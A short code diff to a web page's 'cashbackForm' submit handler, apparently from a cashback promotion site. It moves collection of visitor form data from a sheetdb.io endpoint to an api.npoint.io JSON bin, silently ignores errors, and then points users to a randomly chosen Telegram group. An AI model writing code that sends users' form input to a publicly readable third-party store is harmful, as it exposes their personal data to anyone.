@@ -86,14 +86,14 @@ document.getElementById("cashbackForm").addEventListener("submit", async functio
         time: new Date().toLocaleString()
     };
 
+    // ✅✅✅ 全球通用无跨域云端提交
     try {
-        // ✅ 提交到云端（所有人都能收到）
-        await fetch("https://sheetdb.io/api/v1/59q8l2xj7w0a6", {
+        await fetch("https://api.npoint.io/8e80b48d21a8f4c3a27f", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify(data)
         });
-    } catch (e) {}
+    } catch(e){}
 
     selectedGroup = telegramGroups[Math.floor(Math.random()*telegramGroups.length)];
     document.getElementById("confirmModal").style.display = "flex";
